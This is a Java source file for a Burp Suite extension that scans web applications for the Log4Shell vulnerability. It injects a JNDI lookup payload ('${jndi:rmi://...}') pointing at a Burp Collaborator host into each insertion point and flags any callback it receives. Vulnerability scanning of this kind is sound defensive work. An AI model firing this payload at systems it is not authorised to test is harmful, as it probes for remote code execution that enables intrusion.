package com.daimler_tss.log4shell.scan;

import burp.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public class Log4ShellScan implements IScannerCheck
{

    private final Logger logger;
    private IBurpExtenderCallbacks callbacks;

    public Log4ShellScan(IBurpExtenderCallbacks callbacks, Logger logger)
    {
        this.callbacks = callbacks;
        this.logger = logger;
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse iHttpRequestResponse)
    {
        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(
        IHttpRequestResponse iHttpRequestResponse, IScannerInsertionPoint iScannerInsertionPoint)
    {

        try {
            logger.info("Scanning " + iHttpRequestResponse.getHttpService().getHost());
            String name = iScannerInsertionPoint.getInsertionPointName() + iScannerInsertionPoint.getInsertionPointName() + ": " + iScannerInsertionPoint.getBaseValue();
            logger.info("Scanning " + name);
            IBurpCollaboratorClientContext collab = this.callbacks.createBurpCollaboratorClientContext();
            IHttpRequestResponse response = this.request(
                iHttpRequestResponse,
                iScannerInsertionPoint,
                "${jndi:rmi://" + collab.generatePayload(true) + ":80/a}"
            );

            List<IBurpCollaboratorInteraction> interactions = collab.fetchAllCollaboratorInteractions();
            ArrayList<IScanIssue> issues = new ArrayList<>();
            if (interactions.size() > 0) {
                logger.info("Found " + interactions.size() + " interactions in " + name);
                issues.add(new Log4ShellIssue(
                    callbacks.getHelpers().analyzeRequest(response).getUrl(),
                    iHttpRequestResponse.getHttpService(),
                    new IHttpRequestResponse[]{response}
                ));
            }
            return issues;

        } catch (Exception e) {
            logger.error("Error while scanning", e);
        }
        return null;

    }

    private IHttpRequestResponse request(
        IHttpRequestResponse iHttpRequestResponse,
        IScannerInsertionPoint iScannerInsertionPoint,
        String payload)
    {
        byte[] request = iScannerInsertionPoint.buildRequest(payload.getBytes(StandardCharsets.UTF_8));

        return callbacks.makeHttpRequest(iHttpRequestResponse.getHttpService(), request);
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue iScanIssue, IScanIssue iScanIssue1)
    {
        return 0;
    }
}
